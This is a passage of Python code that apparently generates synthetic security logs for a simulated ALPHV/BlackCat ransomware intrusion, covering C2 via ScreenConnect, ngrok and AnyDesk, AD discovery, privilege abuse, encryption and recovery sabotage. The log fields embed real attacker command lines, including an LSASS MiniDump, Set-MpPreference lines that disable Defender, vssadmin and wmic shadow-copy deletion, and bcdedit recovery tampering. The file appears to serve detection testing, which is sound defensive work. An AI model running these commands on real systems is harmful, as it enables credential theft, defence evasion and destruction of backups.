            "asOrg": ATTACKER_PROFILE["attacker_isp"],
            "isp": ATTACKER_PROFILE["attacker_isp"],
            "domain": "starkglobal.net",
            "isProxy": True,
        },
    }
    events.append(create_event(t, "okta_authentication", "identity_abuse", json.dumps(okta_event)))

    # Persistent session created
    t2 = get_scenario_time(base_time, 10)
    session_event = {
        "uuid": str(uuid.uuid4()),
        "published": t2,
        "eventType": "user.session.start",
        "version": "0",
        "severity": "INFO",
        "legacyEventType": "user.session.start_success",
        "displayMessage": f"Persistent session created for {VICTIM_PROFILE['email']} – no MFA challenge",
        "actor": {
            "id": VICTIM_PROFILE["okta_user_id"],
            "type": "User",
            "alternateId": VICTIM_PROFILE["email"],
            "displayName": VICTIM_PROFILE["name"],
        },
        "client": {
            "userAgent": {
                "rawUserAgent": ATTACKER_PROFILE["stolen_token_user_agent"],
                "os": {"family": "Windows"},
                "browser": {"family": "Chrome"},
            },
            "zone": "PUBLIC",
            "device": "Computer",
            "ipAddress": ATTACKER_PROFILE["attacker_ip"],
            "geographicalContext": {
                "city": ATTACKER_PROFILE["attacker_city"],
                "state": "",
                "country": ATTACKER_PROFILE["attacker_country"],
                "postalCode": "",
                "geolocation": {"lat": 47.0105, "lon": 28.8638},
            },
        },
        "outcome": {"result": "SUCCESS", "reason": "User session started with persistent cookie"},
        "target": [
            {
                "id": str(uuid.uuid4()),
                "type": "AppInstance",
                "alternateId": "Microsoft Office 365",
                "displayName": "Microsoft Office 365",
            }
        ],
        "transaction": {"type": "WEB", "id": str(uuid.uuid4())},
        "debugContext": {
            "debugData": {
                "requestId": str(uuid.uuid4()),
                "requestUri": "/login/sessionCookieRedirect",
                "threatSuspected": "false",
            }
        },
        "authenticationContext": {
            "authenticationStep": 0,
            "externalSessionId": str(uuid.uuid4()),
            "rootSessionId": str(uuid.uuid4()),
        },
        "securityContext": {
            "asNumber": 44477,
            "asOrg": ATTACKER_PROFILE["attacker_isp"],
            "isp": ATTACKER_PROFILE["attacker_isp"],
            "domain": "starkglobal.net",
            "isProxy": True,
        },
    }
    events.append(create_event(t2, "okta_authentication", "identity_abuse", json.dumps(session_event)))

    return events

# ---------------------------------------------------------------------------
# Phase 2 – Command & Control  (Steps 6-7)
# ---------------------------------------------------------------------------

def generate_step6_c2_primary(base_time: datetime) -> List[Dict]:
    """Step 6: Palo Alto + EDR – ScreenConnect installed and calling home.

    The intrusion's primary C2 path abuses legitimate remote management
    tools (ConnectWise ScreenConnect, AnyDesk, Splashtop).  The installer
    runs silently, registers as a Windows service, and connects outbound
    to relay.screenconnect.com over HTTPS.
    """
    events = []

    # 6a – ScreenConnect silent installer launched via msiexec
    t0 = get_scenario_time(base_time, 12)
    s1_install = sentinelone_endpoint_log({
        "event.type": "Process Creation",
        "event.time": ts_ns(base_time, 12),
        "os.name": "Windows",
        "endpoint.name": VICTIM_PROFILE["hostname"],
        "endpoint.type": "workstation",
        "src.process.name": "msiexec.exe",
        "src.process.cmdline": f"msiexec.exe /i C:\\Users\\{VICTIM_PROFILE['username']}\\Downloads\\ConnectWiseControl.Client.exe /quiet /norestart",
        "src.process.image.path": "C:\\Windows\\System32\\msiexec.exe",
        "src.process.parent.name": "powershell.exe",
        "src.process.parent.cmdline": "powershell.exe -NoProfile -WindowStyle Hidden -ep Bypass",
        "src.process.indicatorEvasionCount": 2,
        "src.process.indicatorPersistenceCount": 1,
        "indicator.category": "RemoteAccess",
        "indicator.name": "ScreenConnect Silent Installation",
        "indicator.description": "ConnectWise ScreenConnect client installed silently as a persistence mechanism",
    })
    events.append(create_event(t0, "sentinelone_endpoint", "command_and_control", s1_install))

    # 6b – ScreenConnect service connects outbound to relay
    t = get_scenario_time(base_time, 12, 30)
    s1_net = sentinelone_endpoint_log({
        "event.type": "Network Connection",
        "event.time": ts_ns(base_time, 12, 30),
        "os.name": "Windows",
        "endpoint.name": VICTIM_PROFILE["hostname"],
        "src.process.name": ATTACKER_PROFILE["screenconnect_binary"],
        "src.process.cmdline": f"\"C:\\Program Files (x86)\\ScreenConnect Client\\{ATTACKER_PROFILE['screenconnect_binary']}\"",
        "src.process.image.path": f"C:\\Program Files (x86)\\ScreenConnect Client\\{ATTACKER_PROFILE['screenconnect_binary']}",
        "event.network.direction": "Outbound",
        "event.network.connectionStatus": "Established",
        "event.network.protocolName": "TCP",
        "src.ip.address": VICTIM_PROFILE["normal_ip"],
        "src.port.number": random.randint(49152, 65535),
        "dst.ip.address": ATTACKER_PROFILE["c2_ip_primary"],
        "dst.port.number": ATTACKER_PROFILE["c2_port"],
        "src.process.netConnOutCount": 3,
    })
    events.append(create_event(t, "sentinelone_endpoint", "command_and_control", s1_net))

    # 6c – Palo Alto firewall TRAFFIC log for ScreenConnect relay connection
    pa_traffic = _build_paloalto_c2_traffic(
        base_time, 12,
        src_ip=VICTIM_PROFILE["normal_ip"],
        dst_ip=ATTACKER_PROFILE["c2_ip_primary"],
        dst_port=ATTACKER_PROFILE["c2_port"],
        app="ssl",
        action="allow",
        category="remote-access",
    )
    if pa_traffic.startswith(","):
        pa_traffic = pa_traffic[1:]
    events.append(create_event(t, "paloalto_firewall", "command_and_control", {"raw": pa_traffic}))

    return events

def generate_step7_c2_secondary(base_time: datetime) -> List[Dict]:
    """Step 7: Palo Alto + EDR – ngrok tunnel + AnyDesk as backup C2 channels.

    The intrusion layers multiple remote-access paths for redundancy:
    an ngrok reverse tunnel for ad-hoc shell access, and AnyDesk as a
    second GUI-based remote-control option.
    """
    events = []

    # 7a – ngrok reverse TCP tunnel established
    t1 = get_scenario_time(base_time, 14)
    s1_ngrok = sentinelone_endpoint_log({
        "event.type": "Process Creation",
        "event.time": ts_ns(base_time, 14),
        "os.name": "Windows",
        "endpoint.name": VICTIM_PROFILE["hostname"],
        "src.process.name": "ngrok.exe",
        "src.process.cmdline": f"ngrok.exe tcp 4444 --authtoken 2eKx9Q_REDACTED --region us --log stdout",
        "src.process.image.path": f"C:\\Users\\{VICTIM_PROFILE['username']}\\AppData\\Local\\Temp\\ngrok.exe",
        "src.process.parent.name": "powershell.exe",
        "src.process.parent.cmdline": "powershell.exe -NoProfile -WindowStyle Hidden -ep Bypass",
        "src.process.indicatorEvasionCount": 1,
        "src.process.indicatorGeneralCount": 2,
        "indicator.category": "RemoteAccess",
        "indicator.name": "Ngrok Tunnel Agent",
        "indicator.description": "ngrok reverse tunnel exposing local port as a backup C2 channel",
    })
    events.append(create_event(t1, "sentinelone_endpoint", "command_and_control", s1_ngrok))

    # 7b – ngrok outbound connection to tunnel endpoint
    t2 = get_scenario_time(base_time, 14, 15)
    s1_ngrok_net = sentinelone_endpoint_log({
        "event.type": "Network Connection",
        "event.time": ts_ns(base_time, 14, 15),
        "os.name": "Windows",
        "endpoint.name": VICTIM_PROFILE["hostname"],
        "src.process.name": "ngrok.exe",
        "src.process.cmdline": f"ngrok.exe tcp 4444 --authtoken 2eKx9Q_REDACTED --region us",
        "event.network.direction": "Outbound",
        "event.network.connectionStatus": "Established",
        "event.network.protocolName": "TCP",
        "src.ip.address": VICTIM_PROFILE["normal_ip"],
        "src.port.number": random.randint(49152, 65535),
        "dst.ip.address": ATTACKER_PROFILE["c2_ip_secondary"],
        "dst.port.number": ATTACKER_PROFILE["c2_port_secondary"],
        "src.process.netConnOutCount": 5,
    })
    events.append(create_event(t2, "sentinelone_endpoint", "command_and_control", s1_ngrok_net))

    # 7c – Palo Alto THREAT log for ngrok tunnel traffic
    pa_threat_ngrok = _build_paloalto_c2_threat(
        base_time, 14,
        src_ip=VICTIM_PROFILE["normal_ip"],
        dst_ip=ATTACKER_PROFILE["c2_ip_secondary"],
        dst_port=ATTACKER_PROFILE["c2_port_secondary"],
        threat_category="command-and-control",
        severity="critical",
    )
    if pa_threat_ngrok.startswith(","):
        pa_threat_ngrok = pa_threat_ngrok[1:]
    events.append(create_event(t2, "paloalto_firewall", "command_and_control", {"raw": pa_threat_ngrok}))

    # 7d – AnyDesk installed as secondary remote-access tool
    t3 = get_scenario_time(base_time, 16)
    s1_anydesk = sentinelone_endpoint_log({
        "event.type": "Process Creation",
        "event.time": ts_ns(base_time, 16),
        "os.name": "Windows",
        "endpoint.name": VICTIM_PROFILE["hostname"],
        "src.process.name": ATTACKER_PROFILE["anydesk_binary"],
        "src.process.cmdline": f"C:\\Users\\{VICTIM_PROFILE['username']}\\Downloads\\{ATTACKER_PROFILE['anydesk_binary']} --install \"C:\\ProgramData\\AnyDesk\" --start-with-win --silent",
        "src.process.image.path": f"C:\\Users\\{VICTIM_PROFILE['username']}\\Downloads\\{ATTACKER_PROFILE['anydesk_binary']}",
        "src.process.parent.name": "explorer.exe",
        "src.process.indicatorPersistenceCount": 2,
        "src.process.indicatorEvasionCount": 1,
        "indicator.category": "RemoteAccess",
        "indicator.name": "AnyDesk Remote Desktop Installation",
        "indicator.description": "AnyDesk installed silently with auto-start as secondary remote access",
    })
    events.append(create_event(t3, "sentinelone_endpoint", "command_and_control", s1_anydesk))

    # 7e – AnyDesk outbound connection
    t4 = get_scenario_time(base_time, 16, 20)
    s1_anydesk_net = sentinelone_endpoint_log({
        "event.type": "Network Connection",
        "event.time": ts_ns(base_time, 16, 20),
        "os.name": "Windows",
        "endpoint.name": VICTIM_PROFILE["hostname"],
        "src.process.name": ATTACKER_PROFILE["anydesk_binary"],
        "event.network.direction": "Outbound",
        "event.network.connectionStatus": "Established",
        "event.network.protocolName": "TCP",
        "src.ip.address": VICTIM_PROFILE["normal_ip"],
        "src.port.number": random.randint(49152, 65535),
        "dst.ip.address": ATTACKER_PROFILE["c2_ip_primary"],
        "dst.port.number": ATTACKER_PROFILE["c2_port"],
        "src.process.netConnOutCount": 6,
    })
    events.append(create_event(t4, "sentinelone_endpoint", "command_and_control", s1_anydesk_net))

    # 7f – Palo Alto TRAFFIC log for AnyDesk relay
    pa_traffic_anydesk = _build_paloalto_c2_traffic(
        base_time, 16,
        src_ip=VICTIM_PROFILE["normal_ip"],
        dst_ip=ATTACKER_PROFILE["c2_ip_primary"],
        dst_port=ATTACKER_PROFILE["c2_port"],
        app="anydesk",
        action="allow",
        category="remote-access",
    )
    if pa_traffic_anydesk.startswith(","):
        pa_traffic_anydesk = pa_traffic_anydesk[1:]
    events.append(create_event(t4, "paloalto_firewall", "command_and_control", {"raw": pa_traffic_anydesk}))

    return events

# ---------------------------------------------------------------------------
# Phase 3 – Endpoint Discovery & Staging  (Step 8)
# ---------------------------------------------------------------------------

def generate_step8_discovery(base_time: datetime) -> List[Dict]:
    """Step 8: SentinelOne – discovery commands and LOLBins on HOST-01.

    The intrusion uses a mix of native Windows LOLBins and attacker
    tooling (SharpHound for BloodHound, ADRecon, csvde) to map AD.
    All launched from ScreenConnect's shell session.
    """
    events = []

    discovery_commands = [
        # (process, cmdline, indicator_name)
        ("whoami.exe", "whoami /all /fo list", "Local Identity Enumeration"),
        ("systeminfo.exe", "systeminfo | findstr /B /C:\"OS\" /C:\"Domain\" /C:\"Hotfix\"", "System Information Discovery"),
        ("net.exe", "net group \"Domain Admins\" /domain", "Domain Admin Group Enumeration"),
        ("net.exe", "net group \"Enterprise Admins\" /domain", "Enterprise Admin Group Enumeration"),
        ("nltest.exe", "nltest /dclist:ROARINPENGUIN", "Domain Controller Enumeration"),
        ("csvde.exe", "csvde.exe -f C:\\Users\\Public\\ad_export.csv -r \"(objectClass=user)\" -l \"cn,mail,memberOf,lastLogon\"", "AD User Export via CSVDE"),
        ("powershell.exe", "powershell.exe -ep Bypass -c \"Import-Module .\\ADRecon.ps1; Invoke-ADRecon -OutputType CSV -OutputDir C:\\Users\\Public\\adrecon_out\"", "ADRecon Active Directory Reconnaissance"),
        ("SharpHound.exe", f"C:\\Users\\{VICTIM_PROFILE['username']}\\AppData\\Local\\Temp\\SharpHound.exe --CollectionMethods All --Domain ROARINPENGUIN --ExcludeDCs --OutputDirectory C:\\Users\\Public\\bh_output", "SharpHound BloodHound Collector"),
    ]

    for i, (proc_name, cmdline, indicator_name) in enumerate(discovery_commands):
        t = get_scenario_time(base_time, 20 + i)
        s1 = sentinelone_endpoint_log({
            "event.type": "Process Creation",
            "event.time": ts_ns(base_time, 20 + i),
            "os.name": "Windows",
            "endpoint.name": VICTIM_PROFILE["hostname_secondary"],
            "endpoint.type": "workstation",
            "src.process.name": proc_name,
            "src.process.cmdline": cmdline,
            "src.process.parent.name": ATTACKER_PROFILE["screenconnect_binary"],
            "src.process.parent.cmdline": f"\"C:\\Program Files (x86)\\ScreenConnect Client\\{ATTACKER_PROFILE['screenconnect_binary']}\"",
            "src.process.indicatorReconnaissanceCount": 2 + i,
            "src.process.indicatorGeneralCount": 3 + i,
            "indicator.category": "Discovery",
            "indicator.name": indicator_name,
        })
        events.append(create_event(t, "sentinelone_endpoint", "discovery_staging", s1))

    # BloodHound output zip file creation
    t_bh = get_scenario_time(base_time, 28, 30)
    s1_bh_file = sentinelone_endpoint_log({
        "event.type": "File Creation",
        "event.time": ts_ns(base_time, 28, 30),
        "os.name": "Windows",
        "endpoint.name": VICTIM_PROFILE["hostname_secondary"],
        "src.process.name": "SharpHound.exe",
        "tgt.file.path": f"C:\\Users\\Public\\bh_output\\{datetime.now().strftime('%Y%m%d')}_{random.randint(100000,999999)}_BloodHound.zip",
        "tgt.file.size": random.randint(512000, 2048000),
    })
    events.append(create_event(t_bh, "sentinelone_endpoint", "discovery_staging", s1_bh_file))

    return events

# ---------------------------------------------------------------------------
# Phase 4 – Credential & Privilege Abuse  (Step 9)
# ---------------------------------------------------------------------------

def generate_step9_privilege_escalation(base_time: datetime) -> List[Dict]:
    """Step 9: SentinelOne + Okta – credential theft and admin role assignment."""
    events = []

    # LSASS credential access on endpoint
    t1 = get_scenario_time(base_time, 30)
    s1_cred = sentinelone_endpoint_log({
        "event.type": "Credential Access",
        "event.time": ts_ns(base_time, 30),
        "os.name": "Windows",
        "endpoint.name": VICTIM_PROFILE["hostname_secondary"],
        "src.process.name": "rundll32.exe",
        "src.process.cmdline": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 672 C:\\Temp\\lsass.dmp full",
        "src.process.parent.name": "cmd.exe",
        "src.process.indicatorInfostealerCount": 2,
        "src.process.indicatorPostExploitationCount": 1,
        "src.process.crossProcessOpenProcessCount": 3,
        "indicator.category": "Credentials",
        "indicator.name": "LSASS Memory Dump",
        "indicator.description": "Credential dumping via comsvcs.dll MiniDump of LSASS process",
    })
    events.append(create_event(t1, "sentinelone_endpoint", "privilege_abuse", s1_cred))

    # Windows Security 4672 – special privileges assigned to new logon
    t2 = get_scenario_time(base_time, 31)
    wel_priv = _build_wel_event(
        event_id=4672,
        description="Special privileges assigned to new logon.",
        user=VICTIM_PROFILE["username"],
        domain=VICTIM_PROFILE["domain"],
        computer=VICTIM_PROFILE["hostname_secondary"],
        privileges="SeDebugPrivilege, SeImpersonatePrivilege, SeTcbPrivilege",
    )
    events.append(create_event(t2, "microsoft_windows_eventlog", "privilege_abuse", wel_priv))

    # Okta – admin role assignment
    t3 = get_scenario_time(base_time, 33)
    okta_priv = {
        "uuid": str(uuid.uuid4()),
        "published": t3,
        "eventType": "user.account.privilege.grant",
        "version": "0",
        "severity": "WARN",
        "legacyEventType": "user.account.privilege.grant",
        "displayMessage": f"Admin role granted to {VICTIM_PROFILE['email']}",
        "actor": {
            "id": VICTIM_PROFILE["okta_user_id"],
            "type": "User",
            "alternateId": VICTIM_PROFILE["email"],
            "displayName": VICTIM_PROFILE["name"],
        },
        "client": {
            "userAgent": {
                "rawUserAgent": ATTACKER_PROFILE["stolen_token_user_agent"],
                "os": {"family": "Windows"},
                "browser": {"family": "Chrome"},
            },
            "zone": "PUBLIC",
            "device": "Computer",
            "ipAddress": ATTACKER_PROFILE["attacker_ip"],
            "geographicalContext": {
                "city": ATTACKER_PROFILE["attacker_city"],
                "state": "",
                "country": ATTACKER_PROFILE["attacker_country"],
                "postalCode": "",
                "geolocation": {"lat": 47.0105, "lon": 28.8638},
            },
        },
        "outcome": {"result": "SUCCESS", "reason": "Privilege escalation via admin role grant"},
        "target": [
            {
                "id": VICTIM_PROFILE["okta_user_id"],
                "type": "User",
                "alternateId": VICTIM_PROFILE["email"],
                "displayName": VICTIM_PROFILE["name"],
            },
            {
                "id": str(uuid.uuid4()),
                "type": "Role",
                "alternateId": "SUPER_ADMIN",
                "displayName": "Super Administrator",
            },
        ],
        "transaction": {"type": "WEB", "id": str(uuid.uuid4())},
        "debugContext": {
            "debugData": {
                "requestId": str(uuid.uuid4()),
                "requestUri": "/api/v1/users/{userId}/roles",
                "threatSuspected": "true",
            }
        },
        "authenticationContext": {
            "authenticationStep": 0,
            "externalSessionId": str(uuid.uuid4()),
            "rootSessionId": str(uuid.uuid4()),
        },
        "securityContext": {
            "asNumber": 44477,
            "asOrg": ATTACKER_PROFILE["attacker_isp"],
            "isp": ATTACKER_PROFILE["attacker_isp"],
            "domain": "starkglobal.net",
            "isProxy": True,
        },
    }
    events.append(create_event(t3, "okta_authentication", "privilege_abuse", json.dumps(okta_priv)))

    return events

# ---------------------------------------------------------------------------
# Phase 5 – Ransomware Preparation  (Step 10)
# ---------------------------------------------------------------------------

def generate_step10_ransomware_staging(base_time: datetime) -> List[Dict]:
    """Step 10: SentinelOne – ALPHV/BlackCat ransomware staging on HOST-01.

    The intrusion stages ALPHV: drops the Rust-based binary disguised as
    svchost_update.exe, drops an encrypted config (desktop.dat), disables
    Defender via PowerShell (Set-MpPreference), and pre-positions bcdedit
    to inhibit recovery.
    """
    events = []

    # 10a – Ransomware binary dropped (masquerading as svchost update)
    t1 = get_scenario_time(base_time, 40)
    s1_file = sentinelone_endpoint_log({
        "event.type": "File Creation",
        "event.time": ts_ns(base_time, 40),
        "os.name": "Windows",
        "endpoint.name": VICTIM_PROFILE["hostname_secondary"],
        "src.process.name": ATTACKER_PROFILE["screenconnect_binary"],
        "tgt.file.path": f"C:\\Windows\\Temp\\{ATTACKER_PROFILE['ransomware_binary']}",
        "tgt.file.size": 3145728,
        "src.process.indicatorPersistenceCount": 1,
        "src.process.indicatorRansomwareCount": 1,
        "indicator.category": "Malware",
        "indicator.name": "ALPHV/BlackCat Ransomware Binary",
        "indicator.description": f"Rust-based ALPHV payload dropped as {ATTACKER_PROFILE['ransomware_binary']} via ScreenConnect session",
    })
    events.append(create_event(t1, "sentinelone_endpoint", "ransomware_preparation", s1_file))

    # 10b – Encrypted ALPHV config file dropped alongside binary
    t1b = get_scenario_time(base_time, 40, 10)
    s1_config = sentinelone_endpoint_log({
        "event.type": "File Creation",
        "event.time": ts_ns(base_time, 40, 10),
        "os.name": "Windows",
        "endpoint.name": VICTIM_PROFILE["hostname_secondary"],
        "src.process.name": ATTACKER_PROFILE["screenconnect_binary"],
        "tgt.file.path": f"C:\\Windows\\Temp\\{ATTACKER_PROFILE['ransomware_config']}",
        "tgt.file.size": 8192,
    })
    events.append(create_event(t1b, "sentinelone_endpoint", "ransomware_preparation", s1_config))

    # 10c – Defender disabled via PowerShell Set-MpPreference
    t2 = get_scenario_time(base_time, 41)
    s1_defender = sentinelone_endpoint_log({
        "event.type": "Process Creation",
        "event.time": ts_ns(base_time, 41),
        "os.name": "Windows",
        "endpoint.name": VICTIM_PROFILE["hostname_secondary"],
        "src.process.name": "powershell.exe",
        "src.process.cmdline": "powershell.exe -NoProfile -c \"Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true\"",
        "src.process.parent.name": ATTACKER_PROFILE["screenconnect_binary"],
        "src.process.indicatorEvasionCount": 4,
        "src.process.indicatorGeneralCount": 2,
        "indicator.category": "DefenseEvasion",
        "indicator.name": "Defender Real-Time Protection Disabled",
        "indicator.description": "Windows Defender protections disabled via Set-MpPreference before ransomware execution",
    })
    events.append(create_event(t2, "sentinelone_endpoint", "ransomware_preparation", s1_defender))

    # 10d – bcdedit disables Windows recovery
    t3 = get_scenario_time(base_time, 42)
    s1_bcd = sentinelone_endpoint_log({
        "event.type": "Process Creation",
        "event.time": ts_ns(base_time, 42),
        "os.name": "Windows",
        "endpoint.name": VICTIM_PROFILE["hostname_secondary"],
        "src.process.name": "bcdedit.exe",
        "src.process.cmdline": "bcdedit.exe /set {default} recoveryenabled No",
        "src.process.parent.name": ATTACKER_PROFILE["screenconnect_binary"],
        "src.process.indicatorRansomwareCount": 2,
        "src.process.indicatorEvasionCount": 1,
        "indicator.category": "Impact",
        "indicator.name": "Boot Recovery Disabled",
        "indicator.description": "Recovery environment disabled via bcdedit – ransomware pre-staging",
    })
    events.append(create_event(t3, "sentinelone_endpoint", "ransomware_preparation", s1_bcd))

    return events

# ---------------------------------------------------------------------------
# Phase 6 – Ransomware Execution / Impact  (Steps 11-12)
# ---------------------------------------------------------------------------

def generate_step11_ransomware_execution(base_time: datetime) -> List[Dict]:
    """Step 11: SentinelOne – ALPHV/BlackCat ransomware detection on HOST-01.

    ALPHV is Rust-based and uses --access-token for per-victim config unlock.
    Files are encrypted with a random 7-char extension and a per-directory
    ransom note is dropped.
    """
    events = []

    ext = ATTACKER_PROFILE["ransomware_extension"]

    # 11a – ALPHV binary execution with access token
    t = get_scenario_time(base_time, 50)
    s1_ransom = sentinelone_endpoint_log({
        "event.type": "Malware Detection",
        "event.time": ts_ns(base_time, 50),
        "os.name": "Windows",
        "endpoint.name": VICTIM_PROFILE["hostname_secondary"],
        "src.process.name": ATTACKER_PROFILE["ransomware_binary"],
        "src.process.cmdline": (
            f"C:\\Windows\\Temp\\{ATTACKER_PROFILE['ransomware_binary']} "
            f"--access-token 7f3a2d1e9c --config C:\\Windows\\Temp\\{ATTACKER_PROFILE['ransomware_config']} "
            f"--paths C:\\Users --ext {ext} --log C:\\Windows\\Temp\\enc.log"
        ),
        "src.process.image.path": f"C:\\Windows\\Temp\\{ATTACKER_PROFILE['ransomware_binary']}",
        "src.process.image.sha256": ATTACKER_PROFILE["ransomware_sha256"],
        "src.process.indicatorRansomwareCount": 5,
        "src.process.indicatorEvasionCount": 3,
        "src.process.indicatorPersistenceCount": 2,
        "src.process.indicatorPostExploitationCount": 2,
        "indicator.category": "Malware",
        "indicator.name": f"{ATTACKER_PROFILE['ransomware_family']} Ransomware",
        "indicator.description": f"High-fidelity ransomware detection: {ATTACKER_PROFILE['ransomware_family']} Rust-based encryptor with T1486 mapping",
        "indicator.metadata": json.dumps({
            "threat_type": "Ransomware",
            "family": ATTACKER_PROFILE["ransomware_family"],
            "confidence": 98,
            "action": "Kill",
            "mitre_technique": "T1486",
        }),
    })
    events.append(create_event(t, "sentinelone_endpoint", "ransomware_execution", s1_ransom))

    # 11b – File encryption: realistic business documents encrypted with ALPHV extension
    target_files = [
        ("C:\\Users\\Shared\\Finance", "FY2026_Q1_Revenue_Forecast.xlsx"),
        ("C:\\Users\\Shared\\Finance", "AP_Aging_Report_March2026.pdf"),
        ("C:\\Users\\Shared\\HR", "Employee_Compensation_Database.accdb"),
        ("C:\\Users\\Shared\\Engineering", "Architecture_Diagrams_v4.2.vsdx"),
        (f"C:\\Users\\{VICTIM_PROFILE['username']}\\Documents", "Incident_Response_Runbook.docx"),
        (f"C:\\Users\\{VICTIM_PROFILE['username']}\\Desktop", "VPN_Config_Backup.zip"),
    ]
    for i, (directory, file_name) in enumerate(target_files):
        t_enc = get_scenario_time(base_time, 50, 10 + i * 4)
        s1_file = sentinelone_endpoint_log({
            "event.type": "File Rename",
            "event.time": ts_ns(base_time, 50, 10 + i * 4),
            "os.name": "Windows",
            "endpoint.name": VICTIM_PROFILE["hostname_secondary"],
            "src.process.name": ATTACKER_PROFILE["ransomware_binary"],
            "tgt.file.path": f"{directory}\\{file_name}{ext}",
            "tgt.file.oldPath": f"{directory}\\{file_name}",
            "tgt.file.size": random.randint(102400, 52428800),
        })
        events.append(create_event(t_enc, "sentinelone_endpoint", "ransomware_execution", s1_file))

    # 11c – Ransom note dropped in each encrypted directory
    t_note = get_scenario_time(base_time, 50, 40)
    s1_note = sentinelone_endpoint_log({
        "event.type": "File Creation",
        "event.time": ts_ns(base_time, 50, 40),
        "os.name": "Windows",
        "endpoint.name": VICTIM_PROFILE["hostname_secondary"],
        "src.process.name": ATTACKER_PROFILE["ransomware_binary"],
        "tgt.file.path": f"C:\\Users\\Shared\\Finance\\{ATTACKER_PROFILE['ransom_note']}",
        "tgt.file.size": 4096,
    })
    events.append(create_event(t_note, "sentinelone_endpoint", "ransomware_execution", s1_note))

    return events

def generate_step12_vss_deletion(base_time: datetime) -> List[Dict]:
    """Step 12: SentinelOne + WEL – VSS deletion and backup artifact removal.

    ALPHV/BlackCat spawns child processes for shadow copy deletion.
    Parent is the ransomware binary (svchost_update.exe).
    """
    events = []

    ransomware_cmdline = (
        f"C:\\Windows\\Temp\\{ATTACKER_PROFILE['ransomware_binary']} "
        f"--access-token 7f3a2d1e9c --config C:\\Windows\\Temp\\{ATTACKER_PROFILE['ransomware_config']}"
    )

    # 12a – vssadmin delete shadows
    t1 = get_scenario_time(base_time, 52)
    s1_vss = sentinelone_endpoint_log({
        "event.type": "Process Creation",
        "event.time": ts_ns(base_time, 52),
        "os.name": "Windows",
        "endpoint.name": VICTIM_PROFILE["hostname_secondary"],
        "src.process.name": "vssadmin.exe",
        "src.process.cmdline": "vssadmin.exe delete shadows /all /quiet",
        "src.process.parent.name": ATTACKER_PROFILE["ransomware_binary"],
        "src.process.parent.cmdline": ransomware_cmdline,
        "src.process.indicatorRansomwareCount": 3,
        "indicator.category": "Impact",
        "indicator.name": "Volume Shadow Copy Deletion",
        "indicator.description": "vssadmin used to delete all shadow copies – T1490 Inhibit System Recovery",
    })
    events.append(create_event(t1, "sentinelone_endpoint", "ransomware_impact", s1_vss))

    # 12b – wmic shadowcopy delete (redundant deletion method)
    t2 = get_scenario_time(base_time, 52, 15)
    s1_wmic = sentinelone_endpoint_log({
        "event.type": "Process Creation",
        "event.time": ts_ns(base_time, 52, 15),
        "os.name": "Windows",
        "endpoint.name": VICTIM_PROFILE["hostname_secondary"],
        "src.process.name": "wmic.exe",
        "src.process.cmdline": "wmic shadowcopy delete",
        "src.process.parent.name": ATTACKER_PROFILE["ransomware_binary"],
        "src.process.parent.cmdline": ransomware_cmdline,
        "src.process.indicatorRansomwareCount": 2,
    })
    events.append(create_event(t2, "sentinelone_endpoint", "ransomware_impact", s1_wmic))

    # 12c – sc stop VSS service
    t3 = get_scenario_time(base_time, 52, 30)
    s1_sc = sentinelone_endpoint_log({
        "event.type": "Process Creation",
        "event.time": ts_ns(base_time, 52, 30),
        "os.name": "Windows",
        "endpoint.name": VICTIM_PROFILE["hostname_secondary"],
        "src.process.name": "sc.exe",
        "src.process.cmdline": "sc.exe config VSS start= disabled",
        "src.process.parent.name": ATTACKER_PROFILE["ransomware_binary"],
        "src.process.parent.cmdline": ransomware_cmdline,
    })
    events.append(create_event(t3, "sentinelone_endpoint", "ransomware_impact", s1_sc))

    # 12d – Windows Security 7036: VSS service stopped
    t4 = get_scenario_time(base_time, 52, 35)
    wel_svc = _build_wel_event(
        event_id=7036,
        description="The Volume Shadow Copy service entered the stopped state.",
        user="SYSTEM",
        domain="NT AUTHORITY",
        computer=VICTIM_PROFILE["hostname_secondary"],
        service_name="Volume Shadow Copy",
        service_state="stopped",
    )
    events.append(create_event(t4, "microsoft_windows_eventlog", "ransomware_impact", wel_svc))

    # 12e – bcdedit ignore all boot failures (prevents safe-mode recovery)
    t5 = get_scenario_time(base_time, 53)
    s1_bcd = sentinelone_endpoint_log({
        "event.type": "Process Creation",
        "event.time": ts_ns(base_time, 53),
        "os.name": "Windows",
        "endpoint.name": VICTIM_PROFILE["hostname_secondary"],
        "src.process.name": "bcdedit.exe",
        "src.process.cmdline": "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures",
        "src.process.parent.name": ATTACKER_PROFILE["ransomware_binary"],
        "src.process.parent.cmdline": ransomware_cmdline,
        "src.process.indicatorRansomwareCount": 1,
        "indicator.category": "Impact",
        "indicator.name": "Boot Recovery Policy Tampered",
        "indicator.description": "bcdedit set to ignore all boot failures – prevents safe-mode recovery",
    })
    events.append(create_event(t5, "sentinelone_endpoint", "ransomware_impact", s1_bcd))

    return events

# ---------------------------------------------------------------------------
# Private helpers for building raw Palo Alto and WEL events
# ---------------------------------------------------------------------------

def _build_paloalto_c2_traffic(
    base_time: datetime,
    minutes_offset: int,
    src_ip: str,
    dst_ip: str,
    dst_port: int,
    app: str = "ssl",
    action: str = "allow",
    category: str = "malware",
) -> str:
    """Build a deterministic Palo Alto TRAFFIC CSV line for C2 connection."""
    now = base_time + timedelta(minutes=minutes_offset)
    ts_str = now.strftime("%Y/%m/%d %H:%M:%S")
    src_port = random.randint(49152, 65535)
    session_id = str(random.randint(100000, 999999))
    serial = f"{random.randint(100000000000000, 999999999999999)}"

    fields = [
        "",                         # future_use_1
        ts_str,                     # receive_time
        serial,                     # serial_number
        "TRAFFIC",                  # type
        "end",                      # subtype
        "",                         # future_use_2
        ts_str,                     # time_generated
        src_ip,                     # src
        dst_ip,                     # dst
        src_ip,                     # natsrc
        dst_ip,                     # natdst
        f"{action}-{app}",            # rule
        f"{VICTIM_PROFILE['domain']}\\{VICTIM_PROFILE['username']}",  # srcuser
        "",                         # dstuser
        app,                        # app
        "vsys1",                    # vsys
        "trust",                    # from
        "untrust",                  # to
        "ethernet1/1",              # inbound_if
        "ethernet1/2",              # outbound_if
        "FORWARD",                  # logset
        "",                         # future_use_3
        session_id,                 # sessionid
        "1",                        # repeatcnt
        str(src_port),              # sport
        str(dst_port),              # dport
        str(src_port),              # natsport
        str(dst_port),              # natdport
        "0x0",                      # flags
        "tcp",                      # proto
        action,                    # action
        str(random.randint(5000, 50000)),  # bytes
